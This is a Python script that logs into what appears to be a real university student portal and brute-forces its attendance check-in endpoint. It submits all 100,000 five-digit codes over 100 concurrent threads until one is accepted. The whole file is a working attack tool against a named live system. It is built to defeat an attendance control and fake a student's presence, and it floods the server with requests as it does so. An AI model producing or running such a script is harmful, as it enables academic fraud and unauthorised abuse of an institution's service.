import requests
import concurrent.futures
import time

# URL of the login page
login_url = 'https://izone.sunway.edu.my/login'

# Credentials for login (replace with actual login credentials)
login_data = {
    'form_action': 'submitted',
    'student_uid': '', #enter userID
    'password': '', #enter password
    'g-captcha-response': ''
}

# Function to log in and return session with valid cookies
def login_session():
    session = requests.Session()
    session.post(login_url, data=login_data)
    return session

# Function to submit the form with a given checkin code
def submit_form(session, checkin_code):
    # URL of the form submission page
    form_url = 'https://izone.sunway.edu.my/icheckin/iCheckinNowWithCode'

    # Form data to be sent
    form_data = {
        'checkin_code': checkin_code
    }

    # Submit the form using the session
    response = session.post(form_url, data=form_data)

    # Print the output of the code being tested
    print(f"Testing code: {checkin_code}")

    # Check the response status
    if response.status_code == 200 and 'successfully' in response.text.lower():
        print("Form submitted successfully with code:", checkin_code)
        return True

# Function to submit forms with multiple checkin codes using multithreading
def submit_forms(session):
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:  # Adjust max_workers as needed
        # Submit forms with checkin codes from 00000 to 99999
        futures = [executor.submit(submit_form, session, '{:05d}'.format(code)) for code in range(100000)]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print("Error:", e)

# Record start time
start_time = time.time()

# Log in and get session with valid cookies
session = login_session()

# Start submitting forms
submit_forms(session)

# Calculate elapsed time
elapsed_time = time.time() - start_time

# Print elapsed time
print("Elapsed time:", elapsed_time, "seconds")
